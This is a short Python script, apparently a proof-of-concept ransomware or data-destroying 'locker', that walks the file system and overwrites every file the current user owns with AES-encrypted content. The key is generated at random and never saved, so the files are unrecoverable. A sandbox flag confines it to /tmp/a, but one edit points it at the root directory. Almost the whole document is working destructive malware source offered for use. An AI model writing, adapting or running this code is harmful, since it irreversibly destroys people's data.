#
#	MAD LOCKER
#		By JlXip
#			Under MIT license.
#
#	This is just a PoC. I am not responsible for any given use. You have been warned.
#	Caution: the decryption key is not saved, and thus the files will not be recoverable.
#

from os import walk, stat, urandom	# For getting data from the file system. Walk (recursive list of files), Stat (metadata of a file) and Urandom (random bytes for keys).
from os.path import join	# For joining directory and file name securely.
from pwd import getpwuid	# For getting data of an user from a given UID.
from getpass import getuser as gu	# For getting the user who is running the script.

from Crypto.Cipher import AES	# AES functions. For encrypting files.

SANDBOX = True	# Safe mode (controlled attack of the virus).
# SANDBOX = False	# This will fuck up the user's data. DO NOT EVEN THINK ABOUT RUNNING AS ROOT.

BS = 16	# Block size in bytes.
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()	# Source: https://goo.gl/Uc9t2k

def go(p):	# Get owner of a file
	try: return getpwuid(stat(p).st_uid).pw_name	# Try to get the owner.
	except: return ''	# If it fails, just return an empty string to invalidate the file opening (and avoid crashes).

if __name__ == '__main__':	# Make sure it's not imported from another module.
	d = '/tmp/a' if SANDBOX else '/'	# If SANDBOX mode is set, run the attack under control.
	x = [join(r, f) for r, _, ff in walk(d) for f in ff if (go(join(r, f)) == gu())]	# Get files which the user owns. Quite hard to read.

	c = AES.new(urandom(BS), AES.MODE_CBC, chr(0)*16)	# New AES instance, using a randomly generated key, in CBC mode, with a null initialization vector.

	for y in x:	# Each file.
		try:
			with open(y, 'r+') as f:	# Open it with reading and writing permissions.
				t = c.encrypt(pad(f.read()))	# Read the file, pad it, and encrypt it in memory.
				f.seek(0)	# Overwrite from the beginning.
				f.write(t)	# Write the encrypted content.
				f.truncate()	# Remove the remaining bytes (if any).
		except:	# If the file cannot be read or written, skip it and go to the next one.
			continue